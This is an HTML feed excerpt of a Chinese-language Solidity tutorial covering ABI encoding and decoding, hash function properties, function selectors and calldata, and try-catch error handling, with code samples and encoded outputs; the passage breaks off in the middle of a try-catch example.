    <content type="html"><![CDATA[<h1 id="27-ABI编码解码"><a href="#27-ABI编码解码" class="headerlink" title="27. ABI编码解码"></a>27. ABI编码解码</h1><p><code>ABI</code> (Application Binary Interface，应用二进制接口)是与以太坊智能合约交互的标准。数据基于他们的类型编码；并且由于编码后不包含类型信息，解码时需要注明它们的类型。</p><ul><li><strong>ABI（Application Binary Interface）</strong>，应用二进制接口。</li><li>它定义了合约中函数和事件的调用方式和数据格式。</li><li>简单来说，ABI 就是合约的“接口说明书”，告诉外部如何调用合约函数，如何解析返回值。</li></ul><h2 id="为什么需要-ABI-编码？"><a href="#为什么需要-ABI-编码？" class="headerlink" title="为什么需要 ABI 编码？"></a>为什么需要 ABI 编码？</h2><ul><li>以太坊上的合约调用是通过二进制数据进行的。</li><li>需要把函数名和参数编码成二进制数据，发送到合约地址。</li><li>合约执行完后返回的数据，也需要按照 ABI 格式解码。</li><li>这样保证调用双方（调用者和合约）对数据格式有统一的理解。</li></ul><blockquote><p>所以ABI编码其实是和protoBuf一样的意思</p></blockquote><h2 id="ABI函数"><a href="#ABI函数" class="headerlink" title="ABI函数"></a>ABI函数</h2><table><thead><tr><th>函数</th><th>返回内容</th><th>主要用途</th><th>备注</th></tr></thead><tbody><tr><td><code>abi.encode(...)</code></td><td>参数编码（32字节对齐）</td><td>编码参数数据</td><td>适合参数传递和解码</td></tr><tr><td><code>abi.encodePacked(...)</code></td><td>紧凑编码（无对齐）</td><td>拼接数据、哈希计算</td><td>不适合解码，可能有碰撞风险</td></tr><tr><td><code>abi.encodeWithSignature(...)</code></td><td>函数选择器 + 参数编码</td><td>构造完整调用数据</td><td>通过函数签名字符串计算选择器</td></tr><tr><td><code>abi.encodeWithSelector(...)</code></td><td>函数选择器 + 参数编码</td><td>构造完整调用数据</td><td>直接使用已知选择器</td></tr></tbody></table><h2 id="ABI编码"><a href="#ABI编码" class="headerlink" title="ABI编码"></a>ABI编码</h2><p>编码4个变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint x = 10;<br>address addr = 0x7A58c0Be72BE218B41C608b7Fe7C5bB630736C71;<br>string name = &quot;0xAA&quot;;<br>uint[2] array = [5, 6]; <br></code></pre></td></tr></table></figure><h3 id="abi-encode"><a href="#abi-encode" class="headerlink" title="abi.encode"></a><code>abi.encode</code></h3><p>将给定参数利用<a href="https://learnblockchain.cn/docs/solidity/abi-spec.html">ABI规则</a>编码。<code>ABI</code>被设计出来跟智能合约交互，他将每个参数填充为32字节的数据，并拼接在一起。如果你要和合约交互，你要用的就是<code>abi.encode</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function encode() public view returns(bytes memory result) &#123;<br>    result = abi.encode(x, addr, name, array);<br>&#125;<br></code></pre></td></tr></table></figure><p>编码的结果为</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">000000000000000000000000000000000000000000000000000000000000000</span>a    <span class="hljs-comment">// x</span><br><span class="hljs-number">0000000000000000000000007</span>a58c0be72be218b41c608b7fe7c5bb630736c71    <span class="hljs-comment">// addr</span><br><span class="hljs-number">00000000000000000000000000000000000000000000000000000000000000</span>a0    <span class="hljs-comment">// name 参数的偏移量</span><br><span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000005</span>    <span class="hljs-comment">// array[0]</span><br><span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000006</span>    <span class="hljs-comment">// array[1]</span><br><span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000004</span>    <span class="hljs-comment">// name 参数的长度为4字节</span><br><span class="hljs-number">3078414100000000000000000000000000000000000000000000000000000000</span>    <span class="hljs-comment">// name</span><br></code></pre></td></tr></table></figure><p>其中 <code>name</code> 参数被转换为UTF-8的字节值 <code>0x30784141</code>，在 abi 编码规范中，string 属于动态类型 ，动态类型的参数需要借助偏移量进行编码，可以参考<a href="https://learnblockchain.cn/docs/solidity/abi-spec.html#id9">动态类型的使用</a>。由于 abi.encode 会将每个参与编码的参数元素（包括偏移量，长度）都填充为32字节（evm字长为32字节），所以可以看到编码后的数据中有很多填充的 0 。</p><h3 id="abi-encodePacked"><a href="#abi-encodePacked" class="headerlink" title="abi.encodePacked"></a><code>abi.encodePacked</code></h3><p>将给定参数根据其所需最低空间编码。它类似 <code>abi.encode</code>，但是会把其中填充的很多<code>0</code>省略。比如，只用1字节来编码<code>uint8</code>类型。当你想省空间，并且不与合约交互的时候，可以使用<code>abi.encodePacked</code>，例如算一些数据的<code>hash</code>时。需要注意，<code>abi.encodePacked</code>因为不会做填充，所以不同的输入在拼接后可能会产生相同的编码结果，导致冲突，这也带来了潜在的安全风险。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function encodePacked() public view returns(bytes memory result) &#123;<br>    result = abi.encodePacked(x, addr, name, array);<br>&#125;<br></code></pre></td></tr></table></figure><p>编码的结果为<code>0x000000000000000000000000000000000000000000000000000000000000000a7a58c0be72be218b41c608b7fe7c5bb630736c713078414100000000000000000000000000000000000000000000000000000000000000050000000000000000000000000000000000000000000000000000000000000006</code>，由于<code>abi.encodePacked</code>对编码进行了压缩，长度比<code>abi.encode</code>短很多。</p><h3 id="abi-encodeWithSignature"><a href="#abi-encodeWithSignature" class="headerlink" title="abi.encodeWithSignature"></a><code>abi.encodeWithSignature</code></h3><p>与<code>abi.encode</code>功能类似，只不过第一个参数为<code>函数签名</code>，比如<code>&quot;foo(uint256,address,string,uint256[2])&quot;</code>。当调用其他合约的时候可以使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function encodeWithSignature() public view returns(bytes memory result) &#123;<br>    result = abi.encodeWithSignature(&quot;foo(uint256,address,string,uint256[2])&quot;, x, addr, name, array);<br>&#125;<br></code></pre></td></tr></table></figure><p>编码的结果为<code>0xe87082f1000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000007a58c0be72be218b41c608b7fe7c5bb630736c7100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000043078414100000000000000000000000000000000000000000000000000000000</code>，等同于在<code>abi.encode</code>编码结果前加上了4字节的<code>函数选择器</code><a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/27_ABIEncode/readme.md#user-content-fn-%E8%AF%B4%E6%98%8E-db1ceeb11b1917b93f957b3ad8b2a277">1</a>。</p><h3 id="abi-encodeWithSelector"><a href="#abi-encodeWithSelector" class="headerlink" title="abi.encodeWithSelector"></a><code>abi.encodeWithSelector</code></h3><p>与<code>abi.encodeWithSignature</code>功能类似，只不过第一个参数为<code>函数选择器</code>，为<code>函数签名</code>Keccak哈希的前4个字节。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function encodeWithSelector() public view returns(bytes memory result) &#123;<br>    result = abi.encodeWithSelector(bytes4(keccak256(&quot;foo(uint256,address,string,uint256[2])&quot;)), x, addr, name, array);<br>&#125;<br></code></pre></td></tr></table></figure><p>编码的结果为<code>0xe87082f1000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000007a58c0be72be218b41c608b7fe7c5bb630736c7100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000043078414100000000000000000000000000000000000000000000000000000000</code>，与<code>abi.encodeWithSignature</code>结果一样。</p><h2 id="ABI解码"><a href="#ABI解码" class="headerlink" title="ABI解码"></a>ABI解码</h2><h3 id="abi-decode"><a href="#abi-decode" class="headerlink" title="abi.decode"></a><code>abi.decode</code></h3><p><code>abi.decode</code>用于解码<code>abi.encode</code>生成的二进制编码，将它还原成原本的参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function decode(bytes memory data) public pure returns(uint dx, address daddr, string memory dname, uint[2] memory darray) &#123;<br>    (dx, daddr, dname, darray) = abi.decode(data, (uint, address, string, uint[2]));<br>&#125;<br></code></pre></td></tr></table></figure><p>我们将<code>abi.encode</code>的二进制编码输入给<code>decode</code>，将解码出原来的参数：</p><h2 id="ABI的使用场景"><a href="#ABI的使用场景" class="headerlink" title="ABI的使用场景"></a>ABI的使用场景</h2><ol><li><p>在合约开发中，ABI常配合call来实现对合约的底层调用。</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lasso">bytes4 selector = contract.getValue.selector;<br><br><span class="hljs-built_in">bytes</span> memory <span class="hljs-built_in">data</span> = abi.encodeWithSelector(selector, _x);<br>(bool success, <span class="hljs-built_in">bytes</span> memory returnedData) = address(contract).staticcall(<span class="hljs-built_in">data</span>);<br><span class="hljs-keyword">require</span>(success);<br><br><span class="hljs-keyword">return</span> abi.decode(returnedData, (uint256));<br></code></pre></td></tr></table></figure></li><li><p>ethers.js中常用ABI实现合约的导入和函数调用。</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">const</span> wavePortalContract = <span class="hljs-keyword">new</span> ethers.Contract(contractAddress, contractABI, signer);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    * Call the getAllWaves method from your Smart Contract</span><br><span class="hljs-comment">    */</span><br><span class="hljs-keyword">const</span> waves = <span class="hljs-function">await wavePortalContract.<span class="hljs-title">getAllWaves</span><span class="hljs-params">()</span></span>;<br></code></pre></td></tr></table></figure></li><li><p>对不开源合约进行反编译后，某些函数无法查到函数签名，可通过ABI进行调用。</p><ul><li>0x533ba33a() 是一个反编译后显示的函数，只有函数编码后的结果，并且无法查到函数签名</li></ul><p><img src="/img/web3/solidity27-4.png" alt="27-4"> </p><p><img src="/img/web3/solidity27-5.png" alt="27-4"></p><ul><li>这种情况无法通过构造interface接口或contract来进行调用<img src="/img/web3/solidity27-6.png" alt="27-4"></li></ul><p>这种情况下，就可以通过ABI函数选择器来调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bytes memory data = abi.encodeWithSelector(bytes4(0x533ba33a));<br><br>(bool success, bytes memory returnedData) = address(contract).staticcall(data);<br>require(success);<br><br>return abi.decode(returnedData, (uint256));<br></code></pre></td></tr></table></figure></li></ol><h1 id="28-Hash"><a href="#28-Hash" class="headerlink" title="28. Hash"></a>28. Hash</h1><p>哈希函数（hash function）是一个密码学概念，它可以将任意长度的消息转换为一个固定长度的值，这个值也称作哈希（hash）。</p><h2 id="Hash的性质"><a href="#Hash的性质" class="headerlink" title="Hash的性质"></a>Hash的性质</h2><p>一个好的哈希函数应该具有以下几个特性：</p><ul><li>单向性：从输入的消息到它的哈希的正向运算简单且唯一确定，而反过来非常难，只能靠暴力枚举。</li><li>灵敏性：输入的消息改变一点对它的哈希改变很大。</li><li>高效性：从输入的消息到哈希的运算高效。</li><li>均一性：每个哈希值被取到的概率应该基本相等。</li><li>抗碰撞性：<ul><li>弱抗碰撞性：给定一个消息<code>x</code>，找到另一个消息<code>x&#39;</code>，使得<code>hash(x) = hash(x&#39;)</code>是困难的。</li><li>强抗碰撞性：找到任意<code>x</code>和<code>x&#39;</code>，使得<code>hash(x) = hash(x&#39;)</code>是困难的。</li></ul></li></ul><h2 id="Hash的应用"><a href="#Hash的应用" class="headerlink" title="Hash的应用"></a>Hash的应用</h2><ul><li>生成数据唯一标识</li><li>加密签名</li><li>安全加密</li></ul><h1 id="29-函数选择器Selector"><a href="#29-函数选择器Selector" class="headerlink" title="29. 函数选择器Selector"></a>29. 函数选择器Selector</h1><h2 id="函数选择器"><a href="#函数选择器" class="headerlink" title="函数选择器"></a>函数选择器</h2><p>当我们调用智能合约时，本质上是向目标合约发送了一段<code>calldata</code>，在remix中发送一次交易后，可以在详细信息中看见<code>input</code>即为此次交易的<code>calldata</code></p><p><img src="/img/web3/solidity29-1.png" alt="27-4"></p><p>发送的<code>calldata</code>中前4个字节就是<code>selector</code>（函数选择器）。</p><h3 id="msg-data"><a href="#msg-data" class="headerlink" title="msg.data"></a>msg.data</h3><p><code>msg.data</code>是<code>Solidity</code>中的一个全局变量，值为完整的<code>calldata</code>（调用函数时传入的数据）。可以通过Log事件来看一下这个data是什么样的</p><p>在下面的代码中，我们可以通过<code>Log</code>事件来输出调用<code>mint</code>函数的<code>calldata</code>：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs fortran">// event 返回msg.<span class="hljs-keyword">data</span><br>event <span class="hljs-built_in">Log</span>(bytes <span class="hljs-keyword">data</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span></span> mint(address to) <span class="hljs-keyword">external</span>&#123;<br>    emit <span class="hljs-built_in">Log</span>(msg.<span class="hljs-keyword">data</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>当参数为<code>0x2c44b726ADF1963cA47Af88B284C06f30380fC78</code>时，输出的<code>calldata</code>为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">0x6a6278420000000000000000000000002c44b726adf1963ca47af88b284c06f30380fc78<br></code></pre></td></tr></table></figure><p>这段很乱的字节码可以分成两部分：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">前4个字节为函数选择器selector：<br>0x6a627842<br><br>后面32个字节为输入的参数：<br>0x0000000000000000000000002c44b726adf1963ca47af88b284c06f30380fc78<br></code></pre></td></tr></table></figure><p>其实<code>calldata</code>就是告诉智能合约，我要调用哪个函数，以及参数是什么。</p><h3 id="method-id、selector和函数签名"><a href="#method-id、selector和函数签名" class="headerlink" title="method id、selector和函数签名"></a>method id、selector和函数签名</h3><p><code>method id</code>定义为<code>函数签名</code>的<code>Keccak</code>哈希后的前4个字节，当<code>selector</code>与<code>method id</code>相匹配时，即表示调用该函数，那么<code>函数签名</code>是什么？</p><p>其实在第21讲中，我们简单介绍了函数签名，为<code>&quot;函数名（逗号分隔的参数类型)&quot;</code>。举个例子，上面代码中<code>mint</code>的函数签名为<code>&quot;mint(address)&quot;</code>。在同一个智能合约中，不同的函数有不同的函数签名，因此我们可以通过函数签名来确定要调用哪个函数。</p><p><strong>注意</strong>，在函数签名中，<code>uint</code>和<code>int</code>要写为<code>uint256</code>和<code>int256</code>。</p><p>我们写一个函数，来验证<code>mint</code>函数的<code>method id</code>是否为<code>0x6a627842</code>。大家可以运行下面的函数，看看结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function mintSelector() external pure returns(bytes4 mSelector)&#123;<br>    return bytes4(keccak256(&quot;mint(address)&quot;));<br>&#125;<br></code></pre></td></tr></table></figure><p>结果正是<code>0x6a627842</code>：</p><p>由于计算<code>method id</code>时，需要通过函数名和函数的参数类型来计算。在<code>Solidity</code>中，函数的参数类型主要分为：基础类型参数，固定长度类型参数，可变长度类型参数和映射类型参数。</p><h5 id="基础类型参数"><a href="#基础类型参数" class="headerlink" title="基础类型参数"></a>基础类型参数</h5><p><code>solidity</code>中，基础类型的参数有：<code>uint256</code>(<code>uint8</code>, … , <code>uint256</code>)、<code>bool</code>, <code>address</code>等。在计算<code>method id</code>时，只需要计算<code>bytes4(keccak256(&quot;函数名(参数类型1,参数类型2,...)&quot;))</code>。例如，如下函数，函数名为<code>elementaryParamSelector</code>，参数类型分别为<code>uint256</code>和<code>bool</code>。所以，只需要计算<code>bytes4(keccak256(&quot;elementaryParamSelector(uint256,bool)&quot;))</code>便可得到此函数的<code>method id</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// elementary（基础）类型参数selector<br>// 输入：param1: 1，param2: 0<br>// elementaryParamSelector(uint256,bool) : 0x3ec37834<br>function elementaryParamSelector(uint256 param1, bool param2) external returns(bytes4 selectorWithElementaryParam)&#123;<br>    emit SelectorEvent(this.elementaryParamSelector.selector);<br>    return bytes4(keccak256(&quot;elementaryParamSelector(uint256,bool)&quot;));<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="固定长度类型参数"><a href="#固定长度类型参数" class="headerlink" title="固定长度类型参数"></a>固定长度类型参数</h5><p>固定长度的参数类型通常为固定长度的数组，例如：<code>uint256[5]</code>等。例如，如下函数<code>fixedSizeParamSelector</code>的参数为<code>uint256[3]</code>。因此，在计算该函数的<code>method id</code>时，只需要通过<code>bytes4(keccak256(&quot;fixedSizeParamSelector(uint256[3])&quot;))</code>即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// fixed size（固定长度）类型参数selector<br>// 输入： param1: [1,2,3]<br>// fixedSizeParamSelector(uint256[3]) : 0xead6b8bd<br>function fixedSizeParamSelector(uint256[3] memory param1) external returns(bytes4 selectorWithFixedSizeParam)&#123;<br>    emit SelectorEvent(this.fixedSizeParamSelector.selector);<br>    return bytes4(keccak256(&quot;fixedSizeParamSelector(uint256[3])&quot;));<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="可变长度类型参数"><a href="#可变长度类型参数" class="headerlink" title="可变长度类型参数"></a>可变长度类型参数</h5><p>可变长度参数类型通常为可变长的数组，例如：<code>address[]</code>、<code>uint8[]</code>、<code>string</code>等。例如，如下函数<code>nonFixedSizeParamSelector</code>的参数为<code>uint256[]</code>和<code>string</code>。因此，在计算该函数的<code>method id</code>时，只需要通过<code>bytes4(keccak256(&quot;nonFixedSizeParamSelector(uint256[],string)&quot;))</code>即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// non-fixed size（可变长度）类型参数selector<br>// 输入： param1: [1,2,3]， param2: &quot;abc&quot;<br>// nonFixedSizeParamSelector(uint256[],string) : 0xf0ca01de<br>function nonFixedSizeParamSelector(uint256[] memory param1,string memory param2) external returns(bytes4 selectorWithNonFixedSizeParam)&#123;<br>    emit SelectorEvent(this.nonFixedSizeParamSelector.selector);<br>    return bytes4(keccak256(&quot;nonFixedSizeParamSelector(uint256[],string)&quot;));<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="映射类型参数"><a href="#映射类型参数" class="headerlink" title="映射类型参数"></a>映射类型参数</h5><p>映射类型参数通常有：<code>contract</code>、<code>enum</code>、<code>struct</code>等。在计算<code>method id</code>时，需要将该类型转化成为<code>ABI</code>类型。</p><p>例如，如下函数<code>mappingParamSelector</code>中<code>DemoContract</code>需要转化为<code>address</code>，结构体<code>User</code>需要转化为<code>tuple</code>类型<code>(uint256,bytes)</code>，枚举类型<code>School</code>需要转化为<code>uint8</code>。因此，计算该函数的<code>method id</code>的代码为<code>bytes4(keccak256(&quot;mappingParamSelector(address,(uint256,bytes),uint256[],uint8)&quot;))</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract DemoContract &#123;<br>    // empty contract<br>&#125;<br><br>contract Selector&#123;<br>    // Struct User<br>    struct User &#123;<br>        uint256 uid;<br>        bytes name;<br>    &#125;<br>    // Enum School<br>    enum School &#123; SCHOOL1, SCHOOL2, SCHOOL3 &#125;<br>    ...<br>    // mapping（映射）类型参数selector<br>    // 输入：demo: 0x9D7f74d0C41E726EC95884E0e97Fa6129e3b5E99， user: [1, &quot;0xa0b1&quot;], count: [1,2,3], mySchool: 1<br>    // mappingParamSelector(address,(uint256,bytes),uint256[],uint8) : 0xe355b0ce<br>    function mappingParamSelector(DemoContract demo, User memory user, uint256[] memory count, School mySchool) external returns(bytes4 selectorWithMappingParam)&#123;<br>        emit SelectorEvent(this.mappingParamSelector.selector);<br>        return bytes4(keccak256(&quot;mappingParamSelector(address,(uint256,bytes),uint256[],uint8)&quot;));<br>    &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="使用selector"><a href="#使用selector" class="headerlink" title="使用selector"></a>使用selector</h3><p>我们可以利用<code>selector</code>来调用目标函数。例如我想调用<code>elementaryParamSelector</code>函数，我只需要利用<code>abi.encodeWithSelector</code>将<code>elementaryParamSelector</code>函数的<code>method id</code>作为<code>selector</code>和参数打包编码，传给<code>call</code>函数：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs csharp">   <span class="hljs-comment">// 使用selector来调用函数</span><br>   <span class="hljs-function">function <span class="hljs-title">callWithSignature</span>() external</span>&#123;<br>...<br>       <span class="hljs-comment">// 调用elementaryParamSelector函数</span><br>       (<span class="hljs-built_in">bool</span> success1, bytes memory data1) = address(<span class="hljs-keyword">this</span>).call(abi.encodeWithSelector(<span class="hljs-number">0x3ec37834</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>));<br>...<br>   &#125;<br></code></pre></td></tr></table></figure><p>在日志中，我们可以看到<code>elementaryParamSelector</code>函数被成功调用，并输出<code>Log</code>事件。</p><p><img src="/img/web3/solidity29-3.png" alt="27-4"></p><h2 id="函数选择器的作用"><a href="#函数选择器的作用" class="headerlink" title="函数选择器的作用"></a>函数选择器的作用</h2><ul><li>当你调用合约函数时，交易的 <code>data</code> 字段开头4字节就是函数选择器。</li><li>以太坊虚拟机（EVM）通过这4字节找到对应的函数代码执行。</li><li>选择器后面跟着的就是函数参数的 ABI 编码。</li></ul><blockquote><p>简单比喻：函数选择器就像电话拨号时的“分机号”，告诉接线员（合约）你要找谁（哪个函数），然后接线员把电话接到对应的人那里。</p></blockquote><h2 id="不可取"><a href="#不可取" class="headerlink" title="不可取"></a>不可取</h2><p>“通过函数选择器调用目标函数是不可取的，因为你并不知道目标函数的入参是什么，当你知道了目标函数的入参的时候，其实也就知道了目标函数的签名。”</p><ul><li>你只有函数选择器（4字节）时，<strong>不知道参数类型和顺序，没法正确编码参数</strong>，调用很可能失败。</li><li>只有知道完整的函数签名，才能用 <code>abi.encodeWithSelector</code> 正确编码参数，调用才会成功。</li><li>换句话说，<strong>函数选择器是函数签名的“摘要”，但不能反推完整签名（参数类型）</strong>，只能通过数据库、猜测、反编译等手段辅助确认。</li></ul><h3 id="所以："><a href="#所以：" class="headerlink" title="所以："></a>所以：</h3><ul><li><strong>如果目标合约不开源且没有ABI，单靠函数选择器调用函数非常困难。</strong></li><li><strong>最稳妥的方法是找到目标合约的完整函数签名（ABI），或者官方文档、事件等辅助信息。</strong></li><li><strong>函数选择器是调用的基础，但不是万能钥匙。</strong></li></ul><h1 id="30-Try-Catch"><a href="#30-Try-Catch" class="headerlink" title="30. Try Catch"></a>30. Try Catch</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><ul><li>捕获<strong>外部函数调用</strong>或<strong>合约创建失败时</strong>抛出的异常。</li><li>允许合约优雅地处理错误，而不是直接 revert。</li><li>提升合约的健壮性和容错能力。</li></ul><p><code>try-catch</code>只能被用于<code>external</code>函数或<code>public</code>函数或创建合约时<code>constructor</code>（被视为<code>external</code>函数）的调用。基本语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">try externalContract.f() &#123;<br>    // call成功的情况下 运行一些代码<br>&#125; catch &#123;<br>    // call失败的情况下 运行一些代码<br>&#125;<br>// 其中externalContract.f()是某个外部合约的函数调用，try模块在调用成功的情况下运行，而catch模块则在调用失败时运行<br>// 同样可以使用this.f()来替代externalContract.f()，this.f()也被视作为外部调用，但不可在构造函数中使用，因为此时合约还未创建。<br><br>// 如果调用的函数有返回值，那么必须在try之后声明returns(returnType val)，并且在try模块中可以使用返回的变量；如果是创建合约，那么返回值是新创建的合约变量。<br>try externalContract.f() returns(returnType val)&#123;<br>    // call成功的情况下 运行一些代码<br>&#125; catch &#123;<br>    // call失败的情况下 运行一些代码<br>&#125;<br></code></pre></td></tr></table></figure><p>另外，<code>catch</code>模块支持捕获特殊的异常原因：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// catch目前只有这3种<br>// 1、Error ----这个是捕获带有错误字符串的 revert。revert事件，例如：require(false, &quot;Some error&quot;) 或 revert(&quot;Some error&quot;) 会触发这个分支。<br>// 2、捕获 Solidity 内部的 panic 错误：例如算术溢出、除以零、断言失败等。errorCode 是一个对应的错误码<br>// 3、捕获其他所有低级错误，返回原始的错误数据。这是一个兜底的 catch，用于捕获上述两种之外的错误。<br>try externalContract.f() returns(returnType)&#123;<br>    // call成功的情况下 运行一些代码<br>&#125; catch Error(string memory /*reason*/) &#123;<br>    // 捕获revert(&quot;reasonString&quot;) 和 require(false, &quot;reasonString&quot;)<br>&#125; catch Panic(uint /*errorCode*/) &#123;<br>    // 捕获Panic导致的错误 例如assert失败 溢出 除零 数组访问越界<br>&#125; catch (bytes memory /*lowLevelData*/) &#123;<br>    // 如果发生了revert且上面2个异常类型匹配都失败了 会进入该分支<br>    // 例如revert() require(false) revert自定义类型的error<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>调用execute方法去执行一下，查看log里面释放的事件,</p><ul><li>成功的</li></ul><p><img src="/img/web3/solidity30-1.png" alt="30-1"></p><ul><li>失败的</li></ul><p><img src="/img/web3/solidity30-2.png" alt="30-1"></p><p>如果我们不使用try-catch 的话，调用合约就会直接报错 爆红</p><h3 id="处理合约创建异常"><a href="#处理合约创建异常" class="headerlink" title="处理合约创建异常"></a>处理合约创建异常</h3><p>这里，我们利用<code>try-catch</code>来处理合约创建时的异常。只需要把<code>try</code>模块改写为<code>OnlyEven</code>合约的创建就行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 在创建新合约中使用try-catch （合约创建被视为external call）<br>// executeNew(0)会失败并释放`CatchEvent`<br>// executeNew(1)会失败并释放`CatchByte`<br>// executeNew(2)会成功并释放`SuccessEvent`<br>function executeNew(uint a) external returns (bool success) &#123;<br>    try new OnlyEven(a) returns(OnlyEven _even)&#123;<br>        // call成功的情况下<br>        emit SuccessEvent();<br>        success = _even.onlyEven(a);<br>    &#125; catch Error(string memory reason) &#123;<br>        